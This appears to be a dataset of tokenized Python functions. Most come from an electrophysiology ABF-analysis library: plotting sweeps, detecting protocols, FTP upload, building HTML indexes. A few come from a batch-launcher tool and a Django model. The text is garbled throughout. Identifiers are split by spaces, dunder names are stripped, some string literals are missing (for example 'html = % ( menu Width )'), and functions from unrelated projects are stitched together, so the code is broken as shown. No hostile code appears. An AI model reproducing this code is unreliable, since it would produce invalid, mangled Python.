def msg Dict ( d , matching = None , sep1 = "=" , sep2 = "\n" , sort = True , cant End With = None ) : msg = "" if "record" in str ( type ( d ) ) : keys = d . dtype . names else : keys = d . keys ( ) if sort : keys = sorted ( keys ) for key in keys : if key [ 0 ] == " " : continue if matching : if not key in matching : continue if cant End With and key [ - len ( cant End With ) ] == cant End With : continue if 'float' in str ( type ( d [ key ] ) ) : s = "%.02f" % d [ key ] else : s = str ( d [ key ] ) if "object" in s : s = '<object>' msg += key + sep1 + s + sep2 return msg . strip ( )
def find Relevant Data ( file List , abfs ) : relevant = [ ] things = { } for abf in abfs : for fname in file List : if abf in fname and not fname in relevant : relevant . append ( fname ) for item in sorted ( relevant ) : thing = os . path . basename ( item ) if ".png" in thing : continue if not " " in thing : continue thing = thing . split ( " " ) [ - 1 ] . split ( "." ) [ 0 ] if not thing in things . keys ( ) : #prevent overwriting things [ thing ] = item return things
def determine Protocol ( fname ) : f = open ( fname , 'rb' ) raw = f . read ( 5000 ) #it should be in the first 5k of the file f . close ( ) proto Comment = "unknown" if b"SWH Lab4[" in raw : proto Comment = raw . split ( b"SWH Lab4[" ) [ 1 ] . split ( b"]" , 1 ) [ 0 ] elif b"SWH[" in raw : proto Comment = raw . split ( b"SWH[" ) [ 1 ] . split ( b"]" , 1 ) [ 0 ] else : proto Comment = "?" if not type ( proto Comment ) is str : proto Comment = proto Comment . decode ( "utf-8" ) return proto Comment
def get Parent ( abf Fname ) : child = os . path . abspath ( abf Fname ) files = sorted ( glob . glob ( os . path . dirname ( child ) + "/*.*" ) ) parent ID = abf Fname #its own parent for fname in files : if fname . endswith ( ".abf" ) and fname . replace ( ".abf" , ".TIF" ) in files : parent ID = os . path . basename ( fname ) . replace ( ".abf" , "" ) if os . path . basename ( child ) in fname : break return parent ID
def get Parent2 ( abf Fname , groups ) : if ".abf" in abf Fname : abf Fname = os . path . basename ( abf Fname ) . replace ( ".abf" , "" ) for parent ID in groups . keys ( ) : if abf Fname in groups [ parent ID ] : return parent ID return abf Fname
def get Notes For ABF ( abf File ) : parent = get Parent ( abf File ) parent = os . path . basename ( parent ) . replace ( ".abf" , "" ) exp File = os . path . dirname ( abf File ) + "/experiment.txt" if not os . path . exists ( exp File ) : return "no experiment file" with open ( exp File ) as f : raw = f . readlines ( ) for line in raw : if line [ 0 ] == '~' : line = line [ 1 : ] . strip ( ) if line . startswith ( parent ) : while "\t\t" in line : line = line . replace ( "\t\t" , "\t" ) line = line . replace ( "\t" , "\n" ) return line return "experiment.txt found, but didn't contain %s" % parent
def get I Ds From Files ( files ) : if type ( files ) is str : files = glob . glob ( files + "/*.*" ) I Ds = [ ] for fname in files : if fname [ - 4 : ] . lower ( ) == '.abf' : ext = fname . split ( '.' ) [ - 1 ] I Ds . append ( os . path . basename ( fname ) . replace ( '.' + ext , '' ) ) return sorted ( I Ds )
def inspect ABF ( abf = example ABF , save Too = False , just Plot = False ) : pylab . close ( 'all' ) print ( " ~~ inspect ABF()" ) if type ( abf ) is str : abf = swhlab . ABF ( abf ) swhlab . plot . new ( abf , force New Figure = True ) if abf . sweep Interval * abf . sweeps < 60 * 5 : #shorter than 5 minutes pylab . subplot ( 211 ) pylab . title ( "%s [%s]" % ( abf . ID , abf . proto Comment ) ) swhlab . plot . sweep ( abf , 'all' ) pylab . subplot ( 212 ) swhlab . plot . sweep ( abf , 'all' , continuous = True ) swhlab . plot . comments ( abf ) else : print ( " -- plotting as long recording" ) swhlab . plot . sweep ( abf , 'all' , continuous = True , minutes = True ) swhlab . plot . comments ( abf , minutes = True ) pylab . title ( "%s [%s]" % ( abf . ID , abf . proto Comment ) ) swhlab . plot . annotate ( abf ) if just Plot : return if save Too : path = os . path . split ( abf . fname ) [ 0 ] basename = os . path . basename ( abf . fname ) pylab . savefig ( os . path . join ( path , " " + basename . replace ( ".abf" , ".png" ) ) ) pylab . show ( ) return
def ftp login ( folder = None ) : pw Dir = os . path . realpath ( file ) for i in range ( 3 ) : pw Dir = os . path . dirname ( pw Dir ) pw File = os . path . join ( pw Dir , "passwd.txt" ) print ( " -- looking for login information in:\n   [%s]" % pw File ) try : with open ( pw File ) as f : lines = f . readlines ( ) username = lines [ 0 ] . strip ( ) password = lines [ 1 ] . strip ( ) print ( " -- found a valid username/password" ) except : print ( " -- password lookup FAILED." ) username = TK ask Password ( "FTP LOGIN" , "enter FTP username" ) password = TK ask Password ( "FTP LOGIN" , "enter password for %s" % username ) if not username or not password : print ( " !! failed getting login info. aborting FTP effort." ) return print ( "      username:" , username ) print ( "      password:" , "*" * ( len ( password ) ) ) print ( " -- logging in to FTP ..." ) try : ftp = ftplib . FTP ( "swharden.com" ) ftp . login ( username , password ) if folder : ftp . cwd ( folder ) return ftp except : print ( " !! login failure !!" ) return False
def ftp folder match ( ftp , local Folder , delete Stuff = True ) : for fname in glob . glob ( local Folder + "/*.*" ) : ftp upload ( ftp , fname ) return
def version upload ( fname , username = "nibjb" ) : print ( "popping up pasword window..." ) password = TK ask Password ( "FTP LOGIN" , "enter password for %s" % username ) if not password : return print ( "username:" , username ) print ( "password:" , "*" * ( len ( password ) ) ) print ( "connecting..." ) ftp = ftplib . FTP ( "swharden.com" ) ftp . login ( username , password ) print ( "successful login!" ) ftp . cwd ( "/software/swhlab/versions" ) #IMMEDIATELY GO HERE!!! print ( "uploading" , os . path . basename ( fname ) ) ftp . storbinary ( "STOR " + os . path . basename ( fname ) , open ( fname , "rb" ) , 1024 ) #for binary files print ( "disconnecting..." ) ftp . quit ( )
def TK ask Password ( title = "input" , msg = "type here:" ) : root = tkinter . Tk ( ) root . withdraw ( ) #hide tk window root . attributes ( "-topmost" , True ) #always on top root . lift ( ) #bring to top value = tkinter . simpledialog . askstring ( title , msg ) root . destroy ( ) return value
def TK message ( title , msg ) : root = tkinter . Tk ( ) root . withdraw ( ) #hide tk window root . attributes ( "-topmost" , True ) #always on top root . lift ( ) #bring to top tkinter . messagebox . showwarning ( title , msg ) root . destroy ( )
def TK ask ( title , msg ) : root = tkinter . Tk ( ) root . attributes ( "-topmost" , True ) #always on top root . withdraw ( ) #hide tk window result = tkinter . messagebox . askyesno ( title , msg ) root . destroy ( ) return result
def process Args ( ) : if len ( sys . argv ) < 2 : print ( "\n\n ERROR:" ) print ( "this script requires arguments!" ) print ( 'try "python command.py info"' ) return if sys . argv [ 1 ] == 'info' : print ( "import paths:\n " , "\n  " . join ( sys . path ) ) print ( ) print ( "python version:" , sys . version ) print ( "SWH Lab path:" , file ) print ( "SWH Lab version:" , swhlab . version ) return if sys . argv [ 1 ] == 'glance Folder' : abf Folder = swhlab . common . gui get Folder ( ) if not abf Folder or not os . path . isdir ( abf Folder ) : print ( "bad path" ) return fnames = sorted ( glob . glob ( abf Folder + "/*.abf" ) ) out Folder = tempfile . gettempdir ( ) + "/swhlab/" if os . path . exists ( out Folder ) : shutil . rmtree ( out Folder ) os . mkdir ( out Folder ) out File = out Folder + "/index.html" out = '<html><body>' out += '<h2>%s</h2>' % abf Folder for i , fname in enumerate ( fnames ) : print ( "\n\n### PROCESSING %d of %d" % ( i , len ( fnames ) ) ) save As = os . path . join ( os . path . dirname ( out Folder ) , os . path . basename ( fname ) ) + ".png" out += '<br><br><br><code>%s</code><br>' % os . path . abspath ( fname ) out += '<a href="%s"><img src="%s"></a><br>' % ( save As , save As ) swhlab . analysis . glance . process Abf ( fname , save As ) out += '</body></html>' with open ( out File , 'w' ) as f : f . write ( out ) webbrowser . open new tab ( out File ) return print ( "\n\n ERROR:\n I'm not sure how to process these arguments!" ) print ( sys . argv )
def check sweep ( abf , sweep = None , d T = .1 ) : if abf . A Ps is None : A Ps = [ ] else : A Ps = cm . matrix To Dicts ( abf . A Ps ) if sweep is None or len ( sweep ) == 0 : #find the first sweep with >5A Ps in it for sweep Num in range ( abf . sweeps ) : found In This Sweep = 0 for AP in A Ps : if AP [ "sweep" ] == sweep Num : found In This Sweep += 1 if found In This Sweep >= 5 : break sweep = sweep Num abf . set Sweep ( sweep ) Y = abf . data Y d I = int ( d T / 1000 * abf . rate ) #d I is d T/rate d Y = ( Y [ d I : ] - Y [ : - d I ] ) * ( abf . rate / 1000 / d I ) #now in V/S pylab . figure ( figsize = ( 12 , 6 ) ) ax = pylab . subplot ( 211 ) pylab . title ( "sweep %d" % abf . current Sweep ) pylab . ylabel ( "membrane potential (m V)" ) pylab . plot ( Y , '-' , alpha = .8 ) for AP in A Ps : if not AP [ "sweep" ] == sweep : continue pylab . axvline ( AP [ "sweep I" ] , alpha = .2 , color = 'r' ) pylab . plot ( AP [ "peak I" ] , AP [ "peak" ] , '.' , alpha = .5 , ms = 20 , color = 'r' ) pylab . plot ( AP [ "threshold I" ] , AP [ "threshold" ] , '.' , alpha = .5 , ms = 20 , color = 'c' ) pylab . plot ( [ AP [ "AHPI" ] , AP [ "AH Preturn I" ] ] , [ AP [ "AHP" ] , AP [ "AH Preturn" ] ] , '-' , alpha = .2 , ms = 20 , color = 'b' , lw = 7 ) pylab . plot ( [ AP [ "halfwidth I1" ] , AP [ "halfwidth I2" ] ] , [ AP [ "halfwidth Point" ] , AP [ "halfwidth Point" ] ] , '-' , lw = 5 , alpha = .5 , color = 'g' ) pylab . subplot ( 212 , sharex = ax ) pylab . ylabel ( "velocity (V/S)" ) pylab . xlabel ( "data points (%.02f k Hz)" % ( abf . rate / 1000 ) ) pylab . plot ( d Y , '-' , alpha = .8 ) pylab . margins ( 0 , .1 ) for AP in A Ps : if not AP [ "sweep" ] == sweep : continue pylab . axvline ( AP [ "sweep I" ] , alpha = .2 , color = 'r' ) pylab . plot ( AP [ "upslope I" ] , AP [ "upslope" ] , '.' , alpha = .5 , ms = 20 , color = 'g' ) pylab . plot ( AP [ "downslope I" ] , AP [ "downslope" ] , '.' , alpha = .5 , ms = 20 , color = 'g' ) pylab . axis ( [ A Ps [ 0 ] [ "sweep I" ] - 1000 , A Ps [ - 1 ] [ "sweep I" ] + 1000 , None , None ] )
def stats first ( abf ) : msg = "" for sweep in range ( abf . sweeps ) : for AP in abf . A Ps [ sweep ] : for key in sorted ( AP . keys ( ) ) : if key [ - 1 ] is "I" or key [ - 2 : ] in [ "I1" , "I2" ] : continue msg += "%s = %s\n" % ( key , AP [ key ] ) return msg
def get Avg By Sweep ( abf , feature , T0 = None , T1 = None ) : if T1 is None : T1 = abf . sweep Length if T0 is None : T0 = 0 data = [ np . empty ( ( 0 ) ) ] * abf . sweeps for AP in cm . dict Flat ( cm . matrix To Dicts ( abf . A Ps ) ) : if T0 < AP [ 'sweep T' ] < T1 : val = AP [ feature ] data [ int ( AP [ 'sweep' ] ) ] = np . concatenate ( ( data [ int ( AP [ 'sweep' ] ) ] , [ val ] ) ) for sweep in range ( abf . sweeps ) : if len ( data [ sweep ] ) > 1 and np . any ( data [ sweep ] ) : data [ sweep ] = np . nanmean ( data [ sweep ] ) elif len ( data [ sweep ] ) == 1 : data [ sweep ] = data [ sweep ] [ 0 ] else : data [ sweep ] = np . nan return data
def gain ( abf ) : Ys = np . nan to num ( swhlab . ap . get Avg By Sweep ( abf , 'freq' ) ) Xs = abf . clamp Values ( abf . data X [ int ( abf . proto Seq X [ 1 ] + .01 ) ] ) swhlab . plot . new ( abf , title = "gain function" , xlabel = "command current (p A)" , ylabel = "average inst. freq. (Hz)" ) pylab . plot ( Xs , Ys , '.-' , ms = 20 , alpha = .5 , color = 'b' ) pylab . axhline ( 0 , alpha = .5 , lw = 2 , color = 'r' , ls = "--" ) pylab . margins ( .1 , .1 )
def comments ( abf , minutes = False ) : if not len ( abf . comment Times ) : return for i in range ( len ( abf . comment Times ) ) : t , c = abf . comment Times [ i ] , abf . comment Tags [ i ] if minutes : t = t / 60 pylab . axvline ( t , lw = 1 , color = 'r' , ls = "--" , alpha = .5 ) X1 , X2 , Y1 , Y2 = pylab . axis ( ) Y2 = Y2 - abs ( Y2 - Y1 ) * .02 pylab . text ( t , Y2 , c , size = 8 , color = 'r' , rotation = 'vertical' , ha = 'right' , va = 'top' , weight = 'bold' , alpha = .5 ) if minutes : pylab . xlabel ( "minutes" ) else : pylab . xlabel ( "seconds" )
def annotate ( abf ) : msg = "SWH Lab %s " % str ( swhlab . VERSION ) msg += "ID:%s " % abf . ID msg += "CH:%d " % abf . channel msg += "PROTOCOL:%s " % abf . proto Comment msg += "COMMAND: %d%s " % ( abf . holding , abf . units ) msg += "GENERATED:%s " % '{0:%Y-%m-%d %H:%M:%S}' . format ( datetime . datetime . now ( ) ) pylab . annotate ( msg , ( .001 , .001 ) , xycoords = 'figure fraction' , ha = 'left' , va = 'bottom' , color = '#999999' , family = 'monospace' , size = 8 , weight = 'bold' ) if abf . n ADC > 1 : msg = "Ch %d/%d" % ( abf . channel + 1 , abf . n ADC ) pylab . annotate ( msg , ( .01 , .99 ) , xycoords = 'figure fraction' , ha = 'left' , va = 'top' , color = '#FF0000' , family = 'monospace' , size = 12 , weight = 'bold' )
def try Loading From ( try Path , module Name = 'swhlab' ) : if not 'site-packages' in swhlab . file : print ( "loaded custom swhlab module from" , os . path . dirname ( swhlab . file ) ) return # no need to warn if it's already outside. while len ( try Path ) > 5 : sp = try Path + "/swhlab/" # imaginary swhlab module path if os . path . isdir ( sp ) and os . path . exists ( sp + "/ init .py" ) : if not os . path . dirname ( try Path ) in sys . path : sys . path . insert ( 0 , os . path . dirname ( try Path ) ) print ( "#" * 80 ) print ( "# WARNING: using site-packages swhlab module" ) print ( "#" * 80 ) try Path = os . path . dirname ( try Path ) return
def show ( self ) : copied = self . copy ( ) enumerated = [ el for el in enumerate ( copied ) ] for ( group ind , specs ) in enumerated : if len ( enumerated ) > 1 : print ( "Group %d" % group ind ) ordering = self . constant keys + self . varying keys # Ordered nicely by varying keys definition. spec lines = [ ', ' . join ( [ '%s=%s' % ( k , s [ k ] ) for k in ordering ] ) for s in specs ] print ( '\n' . join ( [ '%d: %s' % ( i , l ) for ( i , l ) in enumerate ( spec lines ) ] ) ) print ( 'Remaining arguments not available for %s' % self . class . name )
def analyze ( fname = False , save = True , show = None ) : if fname and os . path . exists ( fname . replace ( ".abf" , ".rst" ) ) : print ( "SKIPPING DUE TO RST FILE" ) return swhlab . plotting . core . IMAGE SAVE = save if show is None : if cm . is Ipython ( ) : swhlab . plotting . core . IMAGE SHOW = True else : swhlab . plotting . core . IMAGE SHOW = False #swhlab.plotting.core.IMAGE SHOW=show abf = ABF ( fname ) # ensure it's a class print ( ">>>>> PROTOCOL >>>>>" , abf . protocomment ) run Function = "proto unknown" if "proto " + abf . protocomment in globals ( ) : run Function = "proto " + abf . protocomment abf . log . debug ( "running %s()" % ( run Function ) ) plt . close ( 'all' ) # get ready globals ( ) [ run Function ] ( abf ) # run that function try : globals ( ) [ run Function ] ( abf ) # run that function except : abf . log . error ( "EXCEPTION DURING PROTOCOL FUNCTION" ) abf . log . error ( sys . exc info ( ) [ 0 ] ) return "ERROR" plt . close ( 'all' ) # clean up return "SUCCESS"
def figure ( self , force New = False ) : if plt . pylab helpers . Gcf . get num fig managers ( ) > 0 and force New is False : self . log . debug ( "figure already seen, not creating one." ) return if self . subplot : self . log . debug ( "subplot mode enabled, not creating new figure" ) else : self . log . debug ( "creating new figure" ) plt . figure ( figsize = ( self . figure width , self . figure height ) )
def save ( self , callit = "misc" , close Too = True , fullpath = False ) : if fullpath is False : fname = self . abf . out Pre + "plot " + callit + ".jpg" else : fname = callit if not os . path . exists ( os . path . dirname ( fname ) ) : os . mkdir ( os . path . dirname ( fname ) ) plt . savefig ( fname ) self . log . info ( "saved [%s]" , os . path . basename ( fname ) ) if close Too : plt . close ( )
def figure sweeps ( self , offset X = 0 , offset Y = 0 ) : self . log . debug ( "creating overlayed sweeps plot" ) self . figure ( ) for sweep in range ( self . abf . sweeps ) : self . abf . setsweep ( sweep ) self . set Color By Sweep ( ) plt . plot ( self . abf . sweep X2 + sweep * offset X , self . abf . sweep Y + sweep * offset Y , * * self . kwargs ) if offset X : self . margin X = .05 self . decorate ( )
def figure protocol ( self ) : self . log . debug ( "creating overlayed protocols plot" ) self . figure ( ) plt . plot ( self . abf . proto X , self . abf . proto Y , color = 'r' ) self . margin X = 0 self . decorate ( protocol = True )
def figure protocols ( self ) : self . log . debug ( "creating overlayed protocols plot" ) self . figure ( ) for sweep in range ( self . abf . sweeps ) : self . abf . setsweep ( sweep ) plt . plot ( self . abf . proto X , self . abf . proto Y , color = 'r' ) self . margin X = 0 self . decorate ( protocol = True )
def frames ( fname = None , menu Width = 200 , launch = False ) : html = % ( menu Width ) with open ( fname , 'w' ) as f : f . write ( html ) if launch : webbrowser . open ( fname )
def files By Extension ( fnames ) : by Ext = { "abf" : [ ] , "jpg" : [ ] , "tif" : [ ] } # prime it with empties for fname in fnames : ext = os . path . splitext ( fname ) [ 1 ] . replace ( "." , '' ) . lower ( ) if not ext in by Ext . keys ( ) : by Ext [ ext ] = [ ] by Ext [ ext ] = by Ext [ ext ] + [ fname ] return by Ext
def files By Cell ( fnames , cells ) : by Cell = { } fnames = smart Sort ( fnames ) days = list ( set ( [ elem [ : 5 ] for elem in fnames if elem . endswith ( ".abf" ) ] ) ) # so pythonic! for day in smart Sort ( days ) : parent = None for i , fname in enumerate ( [ elem for elem in fnames if elem . startswith ( day ) and elem . endswith ( ".abf" ) ] ) : ID = os . path . splitext ( fname ) [ 0 ] if len ( [ x for x in fnames if x . startswith ( ID ) ] ) - 1 : parent = ID if not parent in by Cell : by Cell [ parent ] = [ ] by Cell [ parent ] = by Cell [ parent ] + [ fname ] return by Cell
def folder Scan ( self , abf Folder = None ) : if abf Folder is None and 'abf Folder' in dir ( self ) : abf Folder = self . abf Folder else : self . abf Folder = abf Folder self . abf Folder = os . path . abspath ( self . abf Folder ) self . log . info ( "scanning [%s]" , self . abf Folder ) if not os . path . exists ( self . abf Folder ) : self . log . error ( "path doesn't exist: [%s]" , abf Folder ) return self . abf Folder2 = os . path . abspath ( self . abf Folder + "/swhlab/" ) if not os . path . exists ( self . abf Folder2 ) : self . log . error ( "./swhlab/ doesn't exist. creating it..." ) os . mkdir ( self . abf Folder2 ) self . fnames = os . listdir ( self . abf Folder ) self . fnames2 = os . listdir ( self . abf Folder2 ) self . log . debug ( "./ has %d files" , len ( self . fnames ) ) self . log . debug ( "./swhlab/ has %d files" , len ( self . fnames2 ) ) self . fnames By Ext = files By Extension ( self . fnames ) if not "abf" in self . fnames By Ext . keys ( ) : self . log . error ( "no ABF files found" ) self . log . debug ( "found %d AB Fs" , len ( self . fnames By Ext [ "abf" ] ) ) self . cells = find Cells ( self . fnames ) # list of cells by their ID self . log . debug ( "found %d cells" % len ( self . cells ) ) self . fnames By Cell = files By Cell ( self . fnames , self . cells ) # only AB Fs self . log . debug ( "grouped cells by number of source files: %s" % str ( [ len ( self . fnames By Cell [ elem ] ) for elem in self . fnames By Cell ] ) )
def html index splash ( self ) : html = % version . version #html+='<code>%s</code><br><br>'%self.abf Folder #html+='<hr>' for parent in smart Sort ( self . fnames By Cell . keys ( ) ) : html += '<br><b><a href="%s.html">%s</a></b><br>' % ( parent , parent ) for child in self . fnames By Cell [ parent ] : fullpath = os . path . join ( self . abf Folder , child ) protocol = swhlab . swh abf . abf Protocol ( fullpath ) html += '<code>%s[%s]</code><br>' % ( fullpath , protocol ) style . save ( html , self . abf Folder2 + "/index splash.html" ) return
def html single All ( self , template = "basic" ) : for fname in smart Sort ( self . cells ) : if template == "fixed" : self . html single fixed ( fname ) else : self . html single basic ( fname )
def proto 01 01 HP010 ( abf = example ABF ) : swhlab . memtest . memtest ( abf ) #knows how to do IC memtest swhlab . memtest . check Sweep ( abf ) #lets you eyeball check how it did swhlab . plot . save ( abf , tag = "tau" )
def proto 01 12 steps025 ( abf = example ABF ) : swhlab . ap . detect ( abf ) standard grouping For Inj ( abf , 200 ) for feature in [ 'freq' , 'downslope' ] : swhlab . ap . plot values ( abf , feature , continuous = False ) #plot AP info swhlab . plot . save ( abf , tag = 'A ' + feature ) swhlab . plot . gain ( abf ) #easy way to do a gain function! swhlab . plot . save ( abf , tag = '05-gain' )
def proto 01 13 steps025dual ( abf = example ABF ) : swhlab . ap . detect ( abf ) standard grouping For Inj ( abf , 200 ) for feature in [ 'freq' , 'downslope' ] : swhlab . ap . plot values ( abf , feature , continuous = False ) #plot AP info swhlab . plot . save ( abf , tag = 'A ' + feature ) f1 = swhlab . ap . get Avg By Sweep ( abf , 'freq' , None , 1 ) f2 = swhlab . ap . get Avg By Sweep ( abf , 'freq' , 1 , None ) f1 = np . nan to num ( f1 ) f2 = np . nan to num ( f2 ) Xs = abf . clamp Values ( abf . data X [ int ( abf . proto Seq X [ 1 ] + .01 ) ] ) swhlab . plot . new ( abf , title = "gain function" , xlabel = "command current (p A)" , ylabel = "average inst. freq. (Hz)" ) pylab . plot ( Xs , f1 , '.-' , ms = 20 , alpha = .5 , label = "step 1" , color = 'b' ) pylab . plot ( Xs , f2 , '.-' , ms = 20 , alpha = .5 , label = "step 2" , color = 'r' ) pylab . legend ( loc = 'upper left' ) pylab . axis ( [ Xs [ 0 ] , Xs [ - 1 ] , None , None ] ) swhlab . plot . save ( abf , tag = 'gain' )
def proto 02 01 MT70 ( abf = example ABF ) : standard overlay With Average ( abf ) swhlab . memtest . memtest ( abf ) swhlab . memtest . check Sweep ( abf ) swhlab . plot . save ( abf , tag = 'check' , resize = False )
def proto 02 03 I Vfast ( abf = example ABF ) : av1 , sd1 = swhlab . plot . IV ( abf , .6 , .9 , True ) swhlab . plot . save ( abf , tag = 'iv1' ) Xs = abf . clamp Values ( .6 ) #generate IV clamp values abf . save Thing ( [ Xs , av1 ] , 'iv' )
def proto 04 01 M Tmon70s2 ( abf = example ABF ) : standard inspect ( abf ) swhlab . memtest . memtest ( abf ) swhlab . memtest . check Sweep ( abf ) swhlab . plot . save ( abf , tag = 'check' , resize = False ) swhlab . memtest . plot standard4 ( abf ) swhlab . plot . save ( abf , tag = 'memtests' )
def proto VC 50 MT IV ( abf = example ABF ) : swhlab . memtest . memtest ( abf ) #do membrane test on every sweep swhlab . memtest . check Sweep ( abf ) #see all MT values swhlab . plot . save ( abf , tag = '02-check' , resize = False ) av1 , sd1 = swhlab . plot . IV ( abf , 1.2 , 1.4 , True , 'b' ) swhlab . plot . save ( abf , tag = 'iv' ) Xs = abf . clamp Values ( 1.2 ) #generate IV clamp values abf . save Thing ( [ Xs , av1 ] , '01 iv' )
def index Images ( folder , fname = "index.html" ) : #TODO: REMOVE html = "<html><body>" for item in glob . glob ( folder + "/*.*" ) : if item . split ( "." ) [ - 1 ] in [ 'jpg' , 'png' ] : html += "<h3>%s</h3>" % os . path . basename ( item ) html += '<img src="%s">' % os . path . basename ( item ) html += '<br>' * 10 html += "</html></body>" f = open ( folder + "/" + fname , 'w' ) f . write ( html ) f . close print ( "indexed:" ) print ( "  " , os . path . abspath ( folder + "/" + fname ) ) return
def save ( self , * args , * * kwargs ) : current activable value = getattr ( self , self . ACTIVATABLE FIELD NAME ) is active changed = self . id is None or self . original activatable value != current activable value self . original activatable value = current activable value ret val = super ( Base Activatable Model , self ) . save ( * args , * * kwargs ) # Emit the signals for when the is active flag is changed if is active changed : model activations changed . send ( self . class , instance ids = [ self . id ] , is active = current activable value ) if self . activatable field updated : model activations updated . send ( self . class , instance ids = [ self . id ] , is active = current activable value ) return ret val
def delete ( self , force = False , * * kwargs ) : if force : return super ( Base Activatable Model , self ) . delete ( * * kwargs ) else : setattr ( self , self . ACTIVATABLE FIELD NAME , False ) return self . save ( update fields = [ self . ACTIVATABLE FIELD NAME ] )
def show ( self , args , file handle = None , * * kwargs ) : full string = '' info = { 'root directory' : '<root directory>' , 'batch name' : '<batch name>' , 'batch tag' : '<batch tag>' , 'batch description' : '<batch description>' , 'launcher' : '<launcher>' , 'timestamp format' : '<timestamp format>' , 'timestamp' : tuple ( time . localtime ( ) ) , 'varying keys' : args . varying keys , 'constant keys' : args . constant keys , 'constant items' : args . constant items } quoted cmds = [ subprocess . list2cmdline ( [ el for el in self ( self . formatter ( s ) , '<tid>' , info ) ] ) for s in args . specs ] cmd lines = [ '%d: %s\n' % ( i , qcmds ) for ( i , qcmds ) in enumerate ( quoted cmds ) ] full string += '' . join ( cmd lines ) if file handle : file handle . write ( full string ) file handle . flush ( ) else : print ( full string )
def cross check launchers ( self , launchers ) : if len ( launchers ) == 0 : raise Exception ( 'Empty launcher list' ) timestamps = [ launcher . timestamp for launcher in launchers ] if not all ( timestamps [ 0 ] == tstamp for tstamp in timestamps ) : raise Exception ( "Launcher timestamps not all equal. " "Consider setting timestamp explicitly." ) root directories = [ ] for launcher in launchers : command = launcher . command args = launcher . args command . verify ( args ) root directory = launcher . get root directory ( ) if os . path . isdir ( root directory ) : raise Exception ( "Root directory already exists: %r" % root directory ) if root directory in root directories : raise Exception ( "Each launcher requires a unique root directory" ) root directories . append ( root directory )
def launch all ( self , launchers ) : for launcher in launchers : print ( "== Launching  %s ==" % launcher . batch name ) launcher ( ) return True
def review all ( self , launchers ) : # Run review of launch args if necessary if self . launch args is not None : proceed = self . review args ( self . launch args , show repr = True , heading = 'Meta Arguments' ) if not proceed : return False reviewers = [ self . review args , self . review command , self . review launcher ] for ( count , launcher ) in enumerate ( launchers ) : # Run reviews for all launchers if desired... if not all ( reviewer ( launcher ) for reviewer in reviewers ) : print ( "\n == Aborting launch ==" ) return False # But allow the user to skip these extra reviews if len ( launchers ) != 1 and count < len ( launchers ) - 1 : skip remaining = self . input options ( [ 'Y' , 'n' , 'quit' ] , '\n Skip remaining reviews?' , default = 'y' ) if skip remaining == 'y' : break elif skip remaining == 'quit' : return False if self . input options ( [ 'y' , 'N' ] , 'Execute?' , default = 'n' ) != 'y' : return False else : return self . launch all ( launchers )
def input options ( self , options , prompt = 'Select option' , default = None ) : check options = [ x . lower ( ) for x in options ] while True : response = input ( '%s [%s]: ' % ( prompt , ', ' . join ( options ) ) ) . lower ( ) if response in check options : return response . strip ( ) elif response == '' and default is not None : return default . lower ( ) . strip ( )
def save ( self , filename , imdata , * * data ) : if isinstance ( imdata , numpy . ndarray ) : imdata = Image . fromarray ( numpy . uint8 ( imdata ) ) elif isinstance ( imdata , Image . Image ) : imdata . save ( self . savepath ( filename ) )
def file Modified Timestamp ( fname ) : modified Time = os . path . getmtime ( fname ) stamp = time . strftime ( '%Y-%m-%d' , time . localtime ( modified Time ) ) return stamp
def load Results ( results File ) : with open ( results File ) as f : raw = f . read ( ) . split ( "\n" ) folders By Day = { } for line in raw : folder = line . split ( '"' ) [ 1 ] + "\\" line = [ ] + line . split ( '"' ) [ 2 ] . split ( ", " ) for day in line [ 1 : ] : if not day in folders By Day : folders By Day [ day ] = [ ] folders By Day [ day ] = folders By Day [ day ] + [ folder ] n Active Days = len ( folders By Day ) day First = sorted ( folders By Day . keys ( ) ) [ 0 ] day Last = sorted ( folders By Day . keys ( ) ) [ - 1 ] day First = datetime . datetime . strptime ( day First , "%Y-%m-%d" ) day Last = datetime . datetime . strptime ( day Last , "%Y-%m-%d" ) n Days = ( day Last - day First ) . days + 1 empty Days = 0 for delta Days in range ( n Days ) : day = day First + datetime . timedelta ( days = delta Days ) stamp = datetime . datetime . strftime ( day , "%Y-%m-%d" ) if not stamp in folders By Day : folders By Day [ stamp ] = [ ] empty Days += 1 perc Active = n Active Days / n Days * 100 print ( "%d of %d days were active (%.02f%%)" % ( n Active Days , n Days , perc Active ) ) return folders By Day
def abfinfo ( self , print Too = False , return Dict = False ) : info = "\n### ABF INFO ###\n" d = { } for thing Name in sorted ( dir ( self ) ) : if thing Name in [ 'cm' , 'ev Is' , 'colormap' , 'data X' , 'data Y' , 'proto X' , 'proto Y' ] : continue if " " in thing Name : continue thing = getattr ( self , thing Name ) if type ( thing ) is list and len ( thing ) > 5 : continue thing Type = str ( type ( thing ) ) . split ( "'" ) [ 1 ] if "method" in thing Type or "neo." in thing Type : continue if thing Name in [ "header" , "MT" ] : continue info += "%s <%s> %s\n" % ( thing Name , thing Type , thing ) d [ thing Name ] = thing if print Too : print ( ) for line in info . split ( "\n" ) : if len ( line ) < 3 : continue print ( "   " , line ) print ( ) if return Dict : return d return info
def header HTML ( self , fname = None ) : if fname is None : fname = self . fname . replace ( ".abf" , " header.html" ) html = "<html><body><code>" html += "<h2>abfinfo() for %s.abf</h2>" % self . ID html += self . abfinfo ( ) . replace ( "<" , "&lt;" ) . replace ( ">" , "&gt;" ) . replace ( "\n" , "<br>" ) html += "<h2>Header for %s.abf</h2>" % self . ID html += pprint . pformat ( self . header , indent = 1 ) html = html . replace ( "\n" , '<br>' ) . replace ( " " , "&nbsp;" ) html = html . replace ( r"\x00" , "" ) html += "</code></body></html>" print ( "WRITING HEADER TO:" ) print ( fname ) f = open ( fname , 'w' ) f . write ( html ) f . close ( )
def generate colormap ( self , colormap = None , reverse = False ) : if colormap is None : colormap = pylab . cm . Dark2 self . cm = colormap self . colormap = [ ] for i in range ( self . sweeps ) : #TODO: make this the only colormap self . colormap . append ( colormap ( i / self . sweeps ) ) if reverse : self . colormap . reverse ( )
def filter gaussian ( self , sigma Ms = 100 , apply Filtered = False , apply Baseline = False ) : if sigma Ms == 0 : return self . data Y filtered = cm . filter gaussian ( self . data Y , sigma Ms ) if apply Baseline : self . data Y = self . data Y - filtered elif apply Filtered : self . data Y = filtered else : return filtered
def to table ( args , vdims = [ ] ) : if not Table : return "Holo Views Table not available" kdims = [ dim for dim in args . constant keys + args . varying keys if dim not in vdims ] items = [ tuple ( [ spec [ k ] for k in kdims + vdims ] ) for spec in args . specs ] return Table ( items , kdims = kdims , vdims = vdims )
def spec formatter ( cls , spec ) : return type ( spec ) ( ( k , str ( v ) ) for ( k , v ) in spec . items ( ) )
